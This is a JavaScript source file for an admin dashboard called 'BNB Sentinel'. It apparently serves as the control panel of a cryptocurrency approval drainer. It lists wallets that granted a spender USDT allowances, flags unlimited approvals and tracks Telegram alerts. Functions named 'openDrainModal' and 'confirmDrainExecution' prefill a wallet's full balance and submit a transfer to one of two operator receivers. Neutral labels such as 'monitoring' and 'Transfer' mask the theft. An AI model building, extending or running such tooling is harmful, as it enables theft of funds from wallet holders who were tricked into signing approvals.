(() => {
    const API_BASE = (window.__ADMIN_PANEL_CONFIG__?.VITE_API_BASE_URL || '').trim().replace(/\/+$/, '');
    const SESSION_KEY = 'nexus-admin-session-token';
    const USER_KEY = 'nexus-admin-username';
    const tabs = ['overview', 'transactions', 'wallets', 'approvals', 'network-logs'];
    const pageDetails = {
        overview: ['Overview', 'Live status from the secure monitoring backend.'],
        transactions: ['Transactions', 'On-chain transfer events and admin-submitted execution history.'],
        wallets: ['Wallets', 'Monitored wallet balances, allowances, and administrative actions.'],
        approvals: ['Approvals', 'Approval events detected for the configured token and spender.'],
        'network-logs': ['Network Logs', 'Monitor cursor and recent events reported by the backend.']
    };
    const state = {
        summary: null,
        wallets: [],
        approvals: [],
        transfers: [],
        history: [],
        monitoring: null,
        search: '',
        currentTab: 'overview',
        loading: false,
        activeWallet: null
    };
    let refreshTimer;

    const byId = (id) => document.getElementById(id);
    const sessionToken = () => sessionStorage.getItem(SESSION_KEY) || localStorage.getItem(SESSION_KEY);
    const getAuthHeaders = () => {
        const token = sessionToken();
        return {
            'Content-Type': 'application/json',
            ...(token ? { Authorization: `Bearer ${token}` } : {})
        };
    };

    function escapeHTML(value) {
        return String(value ?? '').replace(/[&<>"']/g, (character) => ({
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#39;'
        })[character]);
    }

    function formatAddress(value) {
        const text = String(value ?? '');
        return text.length > 14 ? `${text.slice(0, 6)}...${text.slice(-4)}` : text || 'n/a';
    }

    function formatDate(value) {
        if (!value) return 'n/a';
        const date = new Date(value);
        return Number.isNaN(date.getTime())
            ? 'n/a'
            : date.toLocaleString(undefined, { dateStyle: 'medium', timeStyle: 'short' });
    }

    function numberValue(value) {
        const number = Number(value ?? 0);
        return Number.isFinite(number) ? number : 0;
    }

    function formatToken(value, decimals = 6) {
        const text = String(value ?? '0');
        if (!/^\d+(?:\.\d+)?$/.test(text)) return '0';
        const [whole, fraction = ''] = text.split('.');
        const parsedDecimals = Number(decimals);
        const places = Number.isInteger(parsedDecimals) && parsedDecimals >= 0 && parsedDecimals <= 36 ? parsedDecimals : 6;
        const rounded = fraction.slice(0, places).padEnd(places, '0').replace(/0+$/, '');
        const grouped = whole.replace(/\B(?=(\d{3})+(?!\d))/g, ',');
        return rounded ? `${grouped}.${rounded}` : grouped;
    }

    function formatAllowance(value, decimals = 6, tokenSymbol = 'USDT') {
        const units = toTokenUnits(String(value ?? '0'), decimals);
        if (units === (1n << 256n) - 1n) return 'Unlimited USDT';
        return `${formatToken(value, decimals)} ${tokenSymbol} allowance`;
    }

    function formatUnits(value, decimals = 6) {
        try {
            const integer = BigInt(String(value ?? '0'));
            const divisor = 10n ** BigInt(decimals);
            const whole = integer / divisor;
            const remainder = (integer % divisor).toString().padStart(decimals, '0').replace(/0+$/, '');
            return remainder ? `${whole}.${remainder}` : whole.toString();
        } catch {
            return '0';
        }
    }

    function toTokenUnits(value, decimals) {
        if (!/^\d+(?:\.\d+)?$/.test(value)) return null;
        const places = Number(decimals);
        if (!Number.isInteger(places) || places < 0 || places > 36) return null;
        const [whole, fraction = ''] = value.split('.');
        if (fraction.length > places) return null;
        return BigInt(whole) * (10n ** BigInt(places)) + BigInt(fraction.padEnd(places, '0') || '0');
    }

    function sumTokenAmounts(records, getAmount) {
        const values = records.map((record) => String(getAmount(record) ?? '0'));
        const precision = Math.min(36, Math.max(0, ...values.map((value) => value.match(/\.(\d+)/)?.[1].length || 0)));
        const units = values.reduce((total, value) => {
            const parsed = toTokenUnits(value, precision);
            return total + (parsed ?? 0n);
        }, 0n);
        return formatUnits(units.toString(), precision);
    }

    function hasPositiveTokenAmount(value, decimals = 6) {
        const units = toTokenUnits(String(value ?? '0'), decimals);
        return units !== null && units > 0n;
    }

    function emptyRow(columnCount, label = 'No records available.') {
        return `<tr><td colspan="${columnCount}" class="py-8 text-center text-xs text-slate-500">${escapeHTML(label)}</td></tr>`;
    }

    function visibleRecords(records, values) {
        const query = state.search.trim().toLowerCase();
        if (!query) return records;
        return records.filter((record) => values(record).some((value) => String(value ?? '').toLowerCase().includes(query)));
    }

    async function api(path, options = {}) {
        if (!API_BASE) {
            throw new Error('Admin API URL is not configured. Set VITE_API_BASE_URL in admin-panel/.env.');
        }

        let response;
        try {
            response = await fetch(`${API_BASE}${path}`, {
                ...options,
                headers: { ...getAuthHeaders(), ...(options.headers || {}) }
            });
        } catch {
            throw new Error('Cannot reach the admin API. Check that the backend is running and reachable.');
        }

        const data = await response.json().catch(() => ({}));
        if (response.status === 401 && path !== '/api/admin/login') {
            expireSession();
            throw new Error('Your admin session has expired. Please sign in again.');
        }
        if (!response.ok) {
            throw new Error(data.error || `Admin API request failed (${response.status}).`);
        }
        return data;
    }

    function showNotification(message, type = 'success') {
        const container = byId('toast-container');
        if (!container) return;
        const toast = document.createElement('div');
        const color = type === 'error'
            ? 'bg-red-600 shadow-red-600/30'
            : type === 'info'
                ? 'bg-indigo-600 shadow-indigo-600/30'
                : 'bg-emerald-600 shadow-emerald-600/30';
        toast.className = `pointer-events-auto flex items-center gap-3 px-5 py-3.5 rounded-2xl shadow-xl text-xs font-semibold text-white transition-opacity ${color}`;
        const icon = document.createElement('i');
        icon.className = `fa-solid ${type === 'error' ? 'fa-circle-exclamation' : type === 'info' ? 'fa-circle-info' : 'fa-circle-check'} text-base`;
        const text = document.createElement('span');
        text.textContent = message;
        toast.append(icon, text);
        container.appendChild(toast);
        window.setTimeout(() => toast.remove(), 4000);
    }

    function tokenStorage(remember) {
        return remember ? localStorage : sessionStorage;
    }

    function saveSession(token, username, remember) {
        clearSession();
        const storage = tokenStorage(remember);
        storage.setItem(SESSION_KEY, token);
        storage.setItem(USER_KEY, username);
    }

    function clearSession() {
        sessionStorage.removeItem(SESSION_KEY);
        sessionStorage.removeItem(USER_KEY);
        localStorage.removeItem(SESSION_KEY);
        localStorage.removeItem(USER_KEY);
    }

    function displayDashboard(username) {
        byId('admin-user-label').textContent = username || 'Admin';
        byId('admin-email-label').textContent = 'session active';
        byId('login-view').style.display = 'none';
        byId('dashboard-view').classList.remove('hidden');
    }

    function displayLogin() {
        byId('dashboard-view').classList.add('hidden');
        byId('login-view').style.display = 'flex';
        byId('login-view').classList.remove('opacity-0', 'pointer-events-none');
    }

    function expireSession() {
        clearSession();
        window.clearInterval(refreshTimer);
        displayLogin();
    }

    async function handleLogin(event) {
        event.preventDefault();
        const button = event.currentTarget.querySelector('button[type="submit"]');
        const username = byId('login-email').value.trim();
        const passwordInput = byId('login-password');
        const password = passwordInput.value;
        if (!username || !password) {
            showNotification('Enter your admin username and password.', 'error');
            return;
        }
        button.disabled = true;
        button.classList.add('opacity-60', 'cursor-wait');
        try {
            const result = await api('/api/admin/login', {
                method: 'POST',
                body: JSON.stringify({ username, password })
            });
            if (!result.token || !result.user?.username) throw new Error('The API returned an invalid admin session.');
            saveSession(result.token, result.user.username, byId('remember-device').checked);
            passwordInput.value = '';
            displayDashboard(result.user.username);
            showNotification('Secure admin session authorized.');
            await loadDashboard();
            refreshTimer = window.setInterval(() => void loadDashboard(), 15000);
        } catch (error) {
            showNotification(error.message || 'Unable to authenticate.', 'error');
        } finally {
            button.disabled = false;
            button.classList.remove('opacity-60', 'cursor-wait');
        }
    }

    async function handleLogout() {
        const token = sessionToken();
        try {
            if (token) await api('/api/admin/logout', { method: 'POST' });
            showNotification('Session terminated securely.', 'info');
        } catch (error) {
            showNotification(error.message || 'Unable to contact the API during logout.', 'error');
        } finally {
            expireSession();
            byId('login-email').value = '';
            byId('login-password').value = '';
        }
    }

    async function loadDashboard() {
        if (state.loading || !sessionToken()) return;
        state.loading = true;
        try {
            const [summary, wallets, approvals, transfers, history, monitoring] = await Promise.all([
                api('/api/admin/summary'),
                api('/api/admin/wallets'),
                api('/api/admin/approvals'),
                api('/api/admin/transfers'),
                api('/api/admin/history'),
                api('/api/admin/monitoring')
            ]);
            state.summary = summary;
            state.wallets = Array.isArray(wallets) ? wallets : [];
            state.approvals = Array.isArray(approvals) ? approvals : [];
            state.transfers = Array.isArray(transfers) ? transfers : [];
            state.history = Array.isArray(history) ? history : [];
            state.monitoring = monitoring;
            renderDashboard();
            const status = byId('backend-status-label');
            if (status) status.textContent = 'System Online';
        } catch (error) {
            if (sessionToken()) showNotification(error.message || 'Unable to load dashboard data.', 'error');
            const status = byId('backend-status-label');
            if (status) status.textContent = 'Backend unavailable';
        } finally {
            state.loading = false;
        }
    }

    function renderDashboard() {
        const activeNetworks = new Set(state.wallets.filter((wallet) => wallet.active).map((wallet) => wallet.network).filter(Boolean));
        const balanceTotal = sumTokenAmounts(state.wallets, (wallet) => wallet.currentBalance);
        const transferTotal = sumTokenAmounts(state.transfers, (record) => record.transferAmount);
        const pendingApprovals = state.approvals.filter((approval) => approval.processingStatus !== 'processed').length;
        const activeAllowances = state.wallets.filter((wallet) =>
            wallet.active && wallet.approvalLinked && hasPositiveTokenAmount(wallet.currentAllowance, wallet.tokenDecimals)
        ).length;

        byId('stat-volume').textContent = `${formatToken(balanceTotal)} USDT`;
        byId('stat-volume-trend').textContent = `${state.wallets.length} wallet records synced`;
        byId('stat-lifetime-amount').textContent = `${formatToken(transferTotal)} USDT`;
        byId('stat-drained-count').textContent = `${state.transfers.length} incoming transfer events`;
        const lifetimeVolume = state.summary?.lifetimeTransferredVolume;
        const lifetimeAmount = formatUnits(lifetimeVolume?.rawAmount, lifetimeVolume?.decimals);
        byId('stat-transferred-volume').textContent = `${formatToken(lifetimeAmount, lifetimeVolume?.decimals)} ${lifetimeVolume?.tokenSymbol || 'USDT'}`;
        byId('stat-active-networks').textContent = `${activeNetworks.size} ${activeNetworks.size === 1 ? 'Chain' : 'Chains'}`;
        byId('stat-network-pills').innerHTML = [...activeNetworks].slice(0, 4)
            .map((network) => `<span class="px-1.5 py-0.5 bg-[#0b0f19] border border-[#1f2937] text-[9px] font-bold text-slate-300 rounded">${escapeHTML(network)}</span>`)
            .join('') || '<span class="text-[10px] text-slate-400">No active networks</span>';
        byId('stat-pending-approvals').textContent = String(pendingApprovals);
        byId('stat-pending-detail').textContent = `${state.approvals.length} approval events`;
        byId('stat-high-risk').textContent = String(activeAllowances);
        byId('stat-high-risk-detail').textContent = activeAllowances ? 'Active approval allowances' : 'No active allowances';

        const monitorState = state.monitoring || state.summary?.monitoringStatus || {};
        byId('network-name').textContent = state.summary?.network || monitorState.network || 'n/a';
        byId('network-chain').textContent = state.summary?.chainId ?? monitorState.chainId ?? 'n/a';
        byId('network-block').textContent = monitorState.lastProcessedBlock ?? 'n/a';
        byId('network-updated').textContent = monitorState.updatedAt && new Date(monitorState.updatedAt).getTime() > 0
            ? formatDate(monitorState.updatedAt)
            : 'n/a';

        renderLiveLogs();
        renderWallets();
        renderApprovals();
        renderTransactions();
        renderNetworkEvents();
    }

    function renderLiveLogs() {
        const activityTime = (wallet) => [wallet.latestActivityAt, wallet.updatedAt, wallet.createdAt]
            .map((value) => value ? new Date(value).getTime() : NaN)
            .find(Number.isFinite) ?? 0;
        const wallets = visibleRecords(state.wallets, (wallet) => [
            wallet.address, wallet.network, wallet.chainId, wallet.tokenContract,
            wallet.currentBalance, wallet.currentAllowance, wallet.latestApprovalTxHash,
            wallet.latestTransferTxHash
        ]).slice().sort((a, b) => {
            return activityTime(b) - activityTime(a);
        });
        const body = byId('live-logs-tbody');
        if (!wallets.length) {
            body.innerHTML = emptyRow(8, state.search ? 'No wallets match this search.' : 'No monitored wallets have been recorded.');
            return;
        }
        body.innerHTML = wallets.slice(0, 50).map((wallet) => {
            const eventTime = wallet.latestActivityAt || wallet.updatedAt || wallet.createdAt;
            const allowanceCount = wallet.approvalLinked ? '1' : '0';
            const activity = wallet.latestApprovalTxHash
                ? `Approval: ${formatAddress(wallet.latestApprovalTxHash)}`
                : 'No approval event';
            const transfer = wallet.latestTransferTxHash
                ? `Transfer: ${formatAddress(wallet.latestTransferTxHash)}`
                : 'No transfer event';
            const action = wallet.active && wallet.approvalLinked
                ? `<button data-action="transfer" data-address="${escapeHTML(wallet.address)}" class="px-3 py-1.5 bg-indigo-600 hover:bg-indigo-500 text-white rounded-xl text-xs font-semibold transition-all">Transfer</button>`
                : `<span class="text-xs text-slate-500">${wallet.active ? 'Not approval-linked' : 'Inactive'}</span>`;
            return `<tr class="hover:bg-[#1f2937]/40 transition-all">
                <td class="py-4 pl-2"><span class="wallet-address font-bold text-white text-xs block" title="${escapeHTML(wallet.address)}">${escapeHTML(wallet.address || 'n/a')}</span></td>
                <td class="py-4 pr-8 text-right text-xs text-slate-300">${escapeHTML(formatToken(wallet.currentBalance || '0', wallet.tokenDecimals))} ${escapeHTML(wallet.tokenSymbol || 'USDT')}</td>
                <td class="py-4 pl-8 text-xs"><span class="text-slate-300 block">${escapeHTML(formatDate(eventTime))}</span></td>
                <td class="py-4"><span class="px-2.5 py-1 bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 rounded-lg text-xs font-semibold inline-block">${escapeHTML(wallet.network || 'Unknown')}</span><span class="text-[10px] text-slate-500 mt-0.5 block">ID: ${escapeHTML(wallet.chainId || 'n/a')}</span></td>
                <td class="py-4 font-mono text-xs text-slate-300" title="${escapeHTML(wallet.tokenContract || '')}">${escapeHTML(formatAddress(wallet.tokenContract))}</td>
                <td class="py-4"><span class="w-6 h-6 rounded-full ${wallet.approvalLinked ? 'bg-red-500/20 text-red-400' : 'bg-slate-800 text-slate-400'} font-bold text-xs inline-flex items-center justify-center">${allowanceCount}</span></td>
                <td class="py-4 font-mono text-xs text-slate-400">${escapeHTML(state.monitoring?.lastProcessedBlock ?? state.summary?.monitoringStatus?.lastProcessedBlock ?? 'n/a')}</td>
                <td class="py-4 text-xs"><span class="text-slate-300 block">${escapeHTML(activity)}</span><span class="text-slate-500 text-[10px] block">${escapeHTML(transfer)}</span><div class="mt-2">${action}</div></td>
            </tr>`;
        }).join('');
    }

    function renderWallets() {
        const wallets = visibleRecords(state.wallets, (wallet) => [
            wallet.address, wallet.network, wallet.currentBalance, wallet.currentAllowance,
            wallet.active ? 'active' : 'inactive', wallet.tokenSymbol
        ]);
        const body = byId('wallets-tbody');
        if (!wallets.length) {
            body.innerHTML = emptyRow(6, state.search ? 'No wallets match this search.' : 'No monitored wallets have been recorded.');
            return;
        }
        body.innerHTML = wallets.map((wallet) => {
            const actions = wallet.active
                ? `${wallet.approvalLinked ? `<button data-action="transfer" data-address="${escapeHTML(wallet.address)}" class="px-3 py-1.5 bg-indigo-600 hover:bg-indigo-500 text-white rounded-lg text-xs font-semibold">Transfer</button>` : ''}<button data-action="deactivate" data-address="${escapeHTML(wallet.address)}" class="ml-2 px-3 py-1.5 bg-red-950/50 hover:bg-red-900/50 border border-red-900/50 text-red-300 rounded-lg text-xs font-semibold">Deactivate</button>`
                : '<span class="text-xs text-slate-500">No actions</span>';
            return `<tr class="hover:bg-[#1f2937]/40 transition-all">
                <td class="wallet-address py-4 pl-2 font-mono text-xs text-white" title="${escapeHTML(wallet.address)}">${escapeHTML(wallet.address || 'n/a')}</td>
                <td class="py-4 text-xs text-slate-300">${escapeHTML(wallet.network || 'Unknown')} <span class="text-slate-500">(${escapeHTML(wallet.chainId || 'n/a')})</span></td>
                <td class="py-4 text-xs text-slate-300">${escapeHTML(formatToken(wallet.currentBalance || '0', wallet.tokenDecimals))} ${escapeHTML(wallet.tokenSymbol || 'USDT')}</td>
                <td class="py-4 text-xs text-slate-300">${escapeHTML(formatAllowance(wallet.currentAllowance, wallet.tokenDecimals, wallet.tokenSymbol || 'USDT'))}</td>
                <td class="py-4"><span class="px-2.5 py-1 rounded-lg text-xs font-semibold ${wallet.active ? 'bg-emerald-500/10 text-emerald-400' : 'bg-slate-700/50 text-slate-400'}">${wallet.active ? 'Active' : 'Inactive'}</span></td>
                <td class="py-4 text-right pr-2">${actions}</td>
            </tr>`;
        }).join('');
    }

    function renderApprovals() {
        const approvals = visibleRecords(state.approvals, (record) => [
            record.walletAddress, record.ownerAddress, record.spender, record.approvalAmount,
            record.network, record.blockNumber, record.processingStatus, record.transactionHash
        ]);
        const body = byId('approvals-tbody');
        if (!approvals.length) {
            body.innerHTML = emptyRow(7, state.search ? 'No approvals match this search.' : 'No approval events have been recorded.');
            return;
        }
        body.innerHTML = approvals.map((record) => `<tr class="hover:bg-[#1f2937]/40 transition-all">
            <td class="wallet-address py-4 pl-2 font-mono text-xs text-white" title="${escapeHTML(record.walletAddress || record.ownerAddress)}">${escapeHTML(record.walletAddress || record.ownerAddress || 'n/a')}</td>
            <td class="py-4 font-mono text-xs text-slate-300" title="${escapeHTML(record.spender)}">${escapeHTML(formatAddress(record.spender))}</td>
            <td class="py-4 text-xs text-emerald-400">${escapeHTML(formatAllowance(record.approvalAmount, record.tokenDecimals, record.tokenSymbol || 'USDT'))}</td>
            <td class="py-4 text-xs text-slate-300">${escapeHTML(record.network || 'Unknown')} / ${escapeHTML(record.blockNumber ?? 'n/a')}</td>
            <td class="py-4 text-xs text-slate-300">${escapeHTML(record.processingStatus || 'n/a')}</td>
            <td class="py-4 text-xs text-slate-300">${escapeHTML(formatDate(record.blockTimestamp || record.createdAt))}</td>
            <td class="py-4 font-mono text-xs text-slate-400" title="${escapeHTML(record.transactionHash)}">${escapeHTML(formatAddress(record.transactionHash))}</td>
        </tr>`).join('');
    }

    function renderTransactions() {
        const transfers = state.transfers.map((record) => ({
            kind: 'Incoming transfer',
            wallet: record.walletAddress,
            amount: `${formatToken(record.transferAmount, record.tokenDecimals)} ${record.tokenSymbol || 'USDT'}`,
            date: record.blockTimestamp || record.createdAt,
            status: record.processingStatus,
            txHash: record.transactionHash,
            query: [record.walletAddress, record.transferAmount, record.transactionHash, record.network]
        }));
        const history = state.history.map((record) => {
            const wallet = state.wallets.find((item) => item.address?.toLowerCase() === record.wallet?.toLowerCase());
            const decimals = wallet?.tokenDecimals ?? 6;
            return {
                kind: 'Admin transfer',
                wallet: record.wallet,
                amount: `${formatToken(formatUnits(record.amount, decimals), decimals)} ${wallet?.tokenSymbol || 'USDT'}`,
                date: record.createdAt,
                status: record.status,
                txHash: record.txHash,
                query: [record.wallet, record.amount, record.txHash, record.status]
            };
        });
        const records = visibleRecords([...transfers, ...history].sort((first, second) =>
            new Date(second.date || 0).getTime() - new Date(first.date || 0).getTime()
        ), (record) => record.query);
        const body = byId('transactions-tbody');
        if (!records.length) {
            body.innerHTML = emptyRow(5, state.search ? 'No transactions match this search.' : 'No transactions have been recorded.');
            return;
        }
        body.innerHTML = records.map((record) => `<tr class="hover:bg-[#1f2937]/40 transition-all">
            <td class="py-4 pl-2"><span class="block text-xs font-semibold text-white">${escapeHTML(record.kind)}</span><span class="wallet-address block text-[11px] font-mono text-slate-400" title="${escapeHTML(record.wallet)}">${escapeHTML(record.wallet || 'n/a')}</span></td>
            <td class="py-4 text-xs text-emerald-400">${escapeHTML(record.amount)}</td>
            <td class="py-4 text-xs text-slate-300">${escapeHTML(formatDate(record.date))}</td>
            <td class="py-4 text-xs text-slate-300">${escapeHTML(record.status || 'n/a')}</td>
            <td class="py-4 font-mono text-xs text-slate-400" title="${escapeHTML(record.txHash || '')}">${escapeHTML(formatAddress(record.txHash))}</td>
        </tr>`).join('');
    }

    function renderNetworkEvents() {
        const events = [
            ...state.approvals.map((record) => ({
                kind: 'Approval',
                wallet: record.walletAddress || record.ownerAddress,
                amount: `${formatToken(record.approvalAmount, record.tokenDecimals)} ${record.tokenSymbol || 'USDT'}`,
                block: record.blockNumber,
                notification: record.telegramStatus,
                date: record.blockTimestamp || record.createdAt,
                query: [record.walletAddress, record.ownerAddress, record.approvalAmount, record.transactionHash, record.network]
            })),
            ...state.transfers.map((record) => ({
                kind: 'Transfer',
                wallet: record.walletAddress,
                amount: `${formatToken(record.transferAmount, record.tokenDecimals)} ${record.tokenSymbol || 'USDT'}`,
                block: record.blockNumber,
                notification: record.telegramStatus,
                date: record.blockTimestamp || record.createdAt,
                query: [record.walletAddress, record.transferAmount, record.transactionHash, record.network]
            }))
        ].sort((first, second) => new Date(second.date || 0).getTime() - new Date(first.date || 0).getTime());
        const filtered = visibleRecords(events, (record) => record.query);
        const body = byId('network-events-tbody');
        if (!filtered.length) {
            body.innerHTML = emptyRow(6, state.search ? 'No events match this search.' : 'No network events have been recorded.');
            return;
        }
        body.innerHTML = filtered.slice(0, 100).map((record) => `<tr class="hover:bg-[#1f2937]/40 transition-all">
            <td class="py-4 pl-2 text-xs font-semibold text-white">${escapeHTML(record.kind)}</td>
            <td class="wallet-address py-4 font-mono text-xs text-slate-300" title="${escapeHTML(record.wallet)}">${escapeHTML(record.wallet || 'n/a')}</td>
            <td class="py-4 text-xs text-emerald-400">${escapeHTML(record.amount)}</td>
            <td class="py-4 text-xs text-slate-300">${escapeHTML(record.block ?? 'n/a')}</td>
            <td class="py-4 text-xs text-slate-300">${escapeHTML(record.notification || 'n/a')}</td>
            <td class="py-4 text-xs text-slate-300">${escapeHTML(formatDate(record.date))}</td>
        </tr>`).join('');
    }

    function filterLiveLogs() {
        state.search = byId('global-search').value;
        renderDashboard();
    }

    function switchTab(tabName) {
        if (!tabs.includes(tabName)) return;
        state.currentTab = tabName;
        document.querySelectorAll('[data-page-panel]').forEach((panel) => {
            panel.classList.toggle('hidden', panel.id !== `panel-${tabName}`);
        });
        document.querySelectorAll('[data-tab]').forEach((link) => {
            const active = link.dataset.tab === tabName;
            link.classList.toggle('bg-[#F0B90B]/15', active);
            link.classList.toggle('border-[#F0B90B]/30', active);
            link.classList.toggle('border-transparent', !active);
            link.classList.toggle('text-[#F0B90B]', active);
            link.classList.remove('text-white');
            link.classList.toggle('text-slate-400', !active);
        });
        byId('page-title').textContent = pageDetails[tabName][0];
        byId('page-subtitle').textContent = pageDetails[tabName][1];
    }

    function toggleMobileMenu() {
        byId('mobile-menu').classList.toggle('hidden');
    }

    function openDrainModal(address) {
        const wallet = state.wallets.find((record) => record.address?.toLowerCase() === address.toLowerCase());
        if (!wallet || !wallet.active || !wallet.approvalLinked) {
            showNotification('This wallet is not active for monitored transfers.', 'error');
            return;
        }
        state.activeWallet = wallet;
        byId('modal-wallet').value = wallet.address;
        byId('modal-amount').value = String(wallet.currentBalance ?? '0');
        byId('modal-amount').max = String(wallet.currentBalance ?? '0');
        byId('modal-network').value = `${wallet.network || 'Unknown'} (Chain ID: ${wallet.chainId || 'n/a'})`;
        byId('modal-contract').value = wallet.tokenContract || 'n/a';
        byId('modal-receiver').value = String(wallet.receiver || 1);
        byId('drain-modal').classList.remove('hidden');
        byId('modal-amount').focus();
    }

    function closeDrainModal() {
        byId('drain-modal').classList.add('hidden');
        state.activeWallet = null;
    }

    async function confirmDrainExecution() {
        const wallet = state.activeWallet;
        const amount = byId('modal-amount').value.trim();
        const receiver = Number(byId('modal-receiver').value);
        const decimals = wallet?.tokenDecimals ?? 6;
        const amountUnits = toTokenUnits(amount, decimals);
        const allowanceUnits = wallet ? toTokenUnits(String(wallet.currentAllowance || '0'), decimals) : null;
        const balanceUnits = wallet ? toTokenUnits(String(wallet.currentBalance || '0'), decimals) : null;
        if (!wallet || amountUnits === null || amountUnits <= 0n || ![1, 2].includes(receiver)) {
            showNotification('Enter a transfer amount greater than zero and choose a destination.', 'error');
            return;
        }
        if (allowanceUnits === null || amountUnits > allowanceUnits) {
            showNotification('Transfer amount exceeds the wallet allowance.', 'error');
            return;
        }
        if (balanceUnits === null) {
            showNotification('The wallet balance is unavailable or invalid. Refresh the dashboard before submitting.', 'error');
            return;
        }
        if (amountUnits > balanceUnits) {
            showNotification('Transfer amount exceeds the wallet balance.', 'error');
            return;
        }
        const button = document.querySelector('#drain-modal button[onclick="confirmDrainExecution()"]');
        button.disabled = true;
        button.classList.add('opacity-60', 'cursor-wait');
        try {
            const result = await api(`/api/admin/wallets/${encodeURIComponent(wallet.address)}/transfers`, {
                method: 'POST',
                body: JSON.stringify({ amount, receiver })
            });
            closeDrainModal();
            showNotification(`Transfer ${result.status || 'submitted'}${result.txHash ? `: ${formatAddress(result.txHash)}` : '.'}`, result.status === 'failed' ? 'error' : 'success');
            await loadDashboard();
        } catch (error) {
            showNotification(error.message || 'Transfer request failed.', 'error');
        } finally {
            button.disabled = false;
            button.classList.remove('opacity-60', 'cursor-wait');
        }
    }

    async function deactivateWallet(address) {
        const wallet = state.wallets.find((record) => record.address?.toLowerCase() === address.toLowerCase());
        if (!wallet || !window.confirm(`Deactivate monitoring for ${wallet.address}?`)) return;
        try {
            await api(`/api/admin/wallets/${encodeURIComponent(wallet.address)}`, { method: 'DELETE' });
            showNotification('Wallet monitoring deactivated.', 'info');
            await loadDashboard();
        } catch (error) {
            showNotification(error.message || 'Unable to deactivate wallet.', 'error');
        }
    }

    function exportLogsCSV() {
        const columns = ['Wallet Address', 'Balance', 'Allowance', 'Network', 'Chain ID', 'Last Activity', 'Active'];
        const rows = state.wallets.map((wallet) => [
            wallet.address,
            wallet.currentBalance || '0',
            wallet.currentAllowance || '0',
            wallet.network || '',
            wallet.chainId || '',
            wallet.latestActivityAt || wallet.updatedAt || wallet.createdAt || '',
            wallet.active ? 'Yes' : 'No'
        ]);
        if (!rows.length) {
            showNotification('No monitoring data available to export.', 'info');
            return;
        }
        const csvValue = (value) => {
            let text = String(value ?? '');
            if (/^[\s]*[=+\-@\t\r]/.test(text)) text = `'${text}`;
            return `"${text.replace(/"/g, '""')}"`;
        };
        const csv = [columns, ...rows].map((row) => row.map(csvValue).join(',')).join('\r\n');
        const url = URL.createObjectURL(new Blob([csv], { type: 'text/csv;charset=utf-8;' }));
        const anchor = document.createElement('a');
        anchor.href = url;
        anchor.download = 'bnb-sentinel-wallets.csv';
        anchor.click();
        URL.revokeObjectURL(url);
        showNotification('Wallet data exported.');
    }

    document.addEventListener('DOMContentLoaded', () => {
        byId('login-form').addEventListener('submit', handleLogin);
        byId('global-search').addEventListener('input', filterLiveLogs);
        byId('mobile-menu').addEventListener('click', (event) => {
            if (event.target === byId('mobile-menu')) toggleMobileMenu();
        });
        document.addEventListener('click', (event) => {
            const button = event.target.closest('[data-action]');
            if (!button) return;
            const address = button.dataset.address;
            if (button.dataset.action === 'transfer') openDrainModal(address);
            if (button.dataset.action === 'deactivate') void deactivateWallet(address);
        });
        const username = sessionStorage.getItem(USER_KEY) || localStorage.getItem(USER_KEY);
        if (sessionToken()) {
            displayDashboard(username);
            switchTab('overview');
            void loadDashboard().then(() => {
                if (sessionToken()) refreshTimer = window.setInterval(() => void loadDashboard(), 15000);
            });
        } else {
            displayLogin();
        }
    });

    window.switchTab = switchTab;
    window.toggleMobileMenu = toggleMobileMenu;
    window.exportLogsCSV = exportLogsCSV;
    window.closeDrainModal = closeDrainModal;
    window.handleLogout = handleLogout;
    window.confirmDrainExecution = confirmDrainExecution;
    window.loadDashboard = loadDashboard;
    window.filterLiveLogs = filterLiveLogs;
})();
